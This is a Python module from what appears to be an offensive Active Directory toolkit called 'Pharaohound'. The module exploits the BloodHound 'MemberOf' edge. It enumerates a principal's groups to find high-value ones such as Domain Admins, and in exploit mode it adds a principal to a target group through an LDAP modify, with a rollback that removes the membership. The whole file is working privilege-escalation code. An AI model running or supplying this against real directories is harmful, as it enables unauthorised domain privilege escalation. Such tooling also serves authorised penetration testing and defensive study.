"""
Module: MemberOf
================
Exploit the MemberOf BloodHound edge by leveraging membership in a
group that grants additional privileges. When a principal is a member
of a high-privilege group (or can add themselves to one), this module
identifies the escalation path and executes the group membership
manipulation via LDAP.

BloodHound Edge: MemberOf
Attack Vector:   Group-based privilege escalation
Severity:        HIGH
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.member_of")


class MemberOf(ExploitModule):
    """
    Exploit the MemberOf edge by adding a controlled principal to a
    target group, or by identifying that current group membership already
    grants a useful attack surface.

    Two sub-modes:
      - "check"   – Analyse current memberships and report what each
                     group grants (without making changes).
      - "exploit" – Actually add the target principal to the specified
                     group via LDAP modify.
    """

    name: str            = "MemberOf"
    description: str     = (
        "Exploit group membership for privilege escalation. Can add a "
        "controlled principal to a target group or analyse existing "
        "memberships for attack surface."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "MemberOf"
    severity: Severity   = Severity.HIGH
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#memberof",
        "https://attack.mappings.mitre.org/technique/T1098/",
        "https://adsecurity.org/?p=3658",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    def _register_options(self):
        self._add_option(ModuleOption(
            name="mode",
            display_name="Mode",
            description="Operation mode: 'check' to analyse memberships, 'exploit' to add to group.",
            required=True,
            default="check",
            value_type=str,
            choices=["check", "exploit"],
        ))
        self._add_option(ModuleOption(
            name="target_group",
            display_name="Target Group",
            description="DN or SAM name of the group to add the principal to (exploit mode).",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="principal",
            display_name="Principal",
            description="DN or SAM name of the principal to add to the group. Defaults to current user.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain (auto-detected if omitted).",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="high_value_groups",
            display_name="High-Value Groups",
            description="Comma-separated list of high-value group names to look for.",
            required=False,
            default="Domain Admins,Enterprise Admins,Schema Admins,Administrators,Account Operators,Backup Operators,Server Operators",
            value_type=str,
        ))

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided. Bind to the domain first."

        try:
            # Verify the connection is still alive with a simple search
            conn = self.connection
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                conn.who_am_i()
            else:
                return False, "Cannot verify LDAP connection state."
        except Exception as exc:
            return False, f"LDAP connection check failed: {exc}"

        mode = self._opt("mode", kwargs)
        if mode == "exploit":
            target = self._opt("target_group", kwargs)
            if not target:
                return False, "Target group must be specified in exploit mode."

        return True, ""

    # ------------------------------------------------------------------ #
    # Core Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        mode = self._opt("mode", kwargs) or "check"

        if mode == "check":
            return self._check_memberships(**kwargs)
        elif mode == "exploit":
            return self._exploit_add_to_group(**kwargs)
        else:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.ERROR,
                message=f"Unknown mode '{mode}'. Use 'check' or 'exploit'.",
            )

    def _resolve_dn(self, name: str, **kwargs) -> Optional[str]:
        """
        Resolve a SAM account name or partial DN to a full DN via LDAP search.
        Returns the full DN string or None if not found.
        """
        conn = self.connection
        domain = self._opt("domain", kwargs)

        if not name:
            return None

        # If it already looks like a DN, return as-is
        if "," in name and "=" in name:
            return name

        search_base = ""
        if domain:
            dc_parts = domain.split(".")
            search_base = ",".join(f"DC={p}" for p in dc_parts)
        elif hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                search_base = info.other["defaultNamingContext"][0]
        else:
            self.logger.warning("Cannot determine search base; pass 'domain' option.")
            return None

        search_filter = f"(|(sAMAccountName={name})(cn={name}))"
        try:
            conn.search(search_base, search_filter, attributes=["distinguishedName"])
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed for '%s': %s", name, exc)

        return None

    def _check_memberships(self, **kwargs) -> ExploitOutput:
        """
        Query the current user's group memberships and identify high-value
        groups that provide an attack surface.
        """
        conn = self.connection
        principal = self._opt("principal", kwargs)
        high_value_raw = self._opt("high_value_groups", kwargs) or ""
        high_value = [g.strip() for g in high_value_raw.split(",") if g.strip()]

        # Resolve principal DN
        if principal:
            principal_dn = self._resolve_dn(principal, **kwargs)
        else:
            # Use the currently bound user
            try:
                who = ""
                if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                    who = conn.extend.standard.who_am_i()
                elif hasattr(conn, "who_am_i"):
                    who = conn.who_am_i()
                principal_dn = who
            except Exception as exc:
                return ExploitOutput(
                    success=False,
                    result_type=ExploitResult.ERROR,
                    message=f"Cannot determine current user: {exc}",
                )

        if not principal_dn:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.ERROR,
                message=f"Could not resolve principal DN for '{principal}'.",
            )

        self.logger.info("Checking memberships for: %s", principal_dn)

        try:
            # Get tokenGroups (transitive nested groups, returned as SIDs)
            conn.search(
                principal_dn,
                "(objectClass=*)",
                attributes=["tokenGroups", "memberOf"],
            )
            if not conn.entries:
                return ExploitOutput(
                    success=False,
                    result_type=ExploitResult.FAILED,
                    message=f"No LDAP entry found for '{principal_dn}'.",
                )

            entry = conn.entries[0]
            direct_groups = []
            if hasattr(entry, "memberOf"):
                direct_groups = [str(g) for g in entry.memberOf.values] if entry.memberOf.values else []

            # Parse tokenGroups for nested membership
            nested_groups = []
            if hasattr(entry, "tokenGroups") and entry.tokenGroups.values:
                from ldap3.utils.conv import sid_to_str
                for sid_bytes in entry.tokenGroups.values:
                    try:
                        sid_str = sid_to_str(sid_bytes)
                        nested_groups.append(sid_str)
                    except Exception:
                        pass

            # Check for high-value groups
            high_value_hits = []
            for group_dn in direct_groups:
                cn = group_dn.split(",")[0].replace("CN=", "")
                for hv in high_value:
                    if hv.lower() == cn.lower():
                        high_value_hits.append(group_dn)
                        break

            data = {
                "principal_dn": principal_dn,
                "direct_groups": direct_groups,
                "direct_group_count": len(direct_groups),
                "nested_group_sids": nested_groups,
                "nested_group_count": len(nested_groups),
                "high_value_groups": high_value_hits,
                "high_value_count": len(high_value_hits),
            }

            message = (
                f"Principal '{principal_dn}' is a member of {len(direct_groups)} "
                f"direct groups and {len(nested_groups)} nested groups."
            )
            if high_value_hits:
                message += f" HIGH-VALUE GROUPS FOUND: {high_value_hits}"

            return ExploitOutput(
                success=len(high_value_hits) > 0 or len(direct_groups) > 0,
                result_type=ExploitResult.SUCCESS if high_value_hits else ExploitResult.SUCCESS,
                message=message,
                data=data,
            )

        except Exception as exc:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.ERROR,
                message=f"Membership enumeration failed: {exc}",
            )

    def _exploit_add_to_group(self, **kwargs) -> ExploitOutput:
        """
        Add a principal to a target group via LDAP modify (ADD operation
        on the 'member' attribute of the group).
        """
        conn = self.connection
        target_group = self._opt("target_group", kwargs)
        principal = self._opt("principal", kwargs)

        # Resolve DNs
        group_dn = self._resolve_dn(target_group, **kwargs)
        if not group_dn:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target group '{target_group}'.",
            )

        principal_dn = self._resolve_dn(principal, **kwargs) if principal else None
        if not principal_dn:
            # Fall back to currently bound user
            try:
                if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                    principal_dn = conn.extend.standard.who_am_i()
                elif hasattr(conn, "who_am_i"):
                    principal_dn = conn.who_am_i()
            except Exception as exc:
                return ExploitOutput(
                    success=False,
                    result_type=ExploitResult.ERROR,
                    message=f"Cannot resolve principal and cannot determine bound user: {exc}",
                )

        self.logger.info(
            "Adding '%s' to group '%s' ...", principal_dn, group_dn
        )

        try:
            # Check if already a member
            conn.search(
                group_dn,
                "(objectClass=*)",
                attributes=["member"],
            )
            if conn.entries and hasattr(conn.entries[0], "member"):
                current_members = conn.entries[0].member.values or []
                if principal_dn in current_members:
                    return ExploitOutput(
                        success=True,
                        result_type=ExploitResult.SKIPPED,
                        message=f"Principal '{principal_dn}' is already a member of '{group_dn}'.",
                        data={"group_dn": group_dn, "principal_dn": principal_dn, "already_member": True},
                    )

            # Perform the ADD operation
            result = conn.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_ADD, [principal_dn])]},
            )

            if result:
                self.logger.info("Successfully added '%s' to '%s'.", principal_dn, group_dn)
                return ExploitOutput(
                    success=True,
                    result_type=ExploitResult.SUCCESS,
                    message=f"Successfully added '{principal_dn}' to group '{group_dn}'.",
                    data={
                        "group_dn": group_dn,
                        "principal_dn": principal_dn,
                        "action": "added",
                    },
                    rollback_data={
                        "group_dn": group_dn,
                        "principal_dn": principal_dn,
                        "operation": "remove_member",
                    },
                )
            else:
                errors = conn.result.get("description", "Unknown LDAP error")
                return ExploitOutput(
                    success=False,
                    result_type=ExploitResult.FAILED,
                    message=f"Failed to add to group: {errors}",
                    data={"ldap_result": conn.result},
                )

        except Exception as exc:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.ERROR,
                message=f"Exception during group membership add: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #

    def rollback(self, **kwargs) -> ExploitOutput:
        """
        Remove the principal from the group (undo an exploit() call).
        """
        conn = self.connection
        group_dn = kwargs.get("group_dn")
        principal_dn = kwargs.get("principal_dn")

        if not group_dn or not principal_dn:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.ERROR,
                message="Rollback requires 'group_dn' and 'principal_dn'.",
            )

        try:
            import ldap3
            result = conn.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_DELETE, [principal_dn])]},
            )
            if result:
                return ExploitOutput(
                    success=True,
                    result_type=ExploitResult.SUCCESS,
                    message=f"Removed '{principal_dn}' from '{group_dn}'.",
                )
            else:
                return ExploitOutput(
                    success=False,
                    result_type=ExploitResult.FAILED,
                    message=f"Rollback failed: {conn.result.get('description', 'Unknown error')}",
                )
        except Exception as exc:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.ERROR,
                message=f"Rollback exception: {exc}",
            )

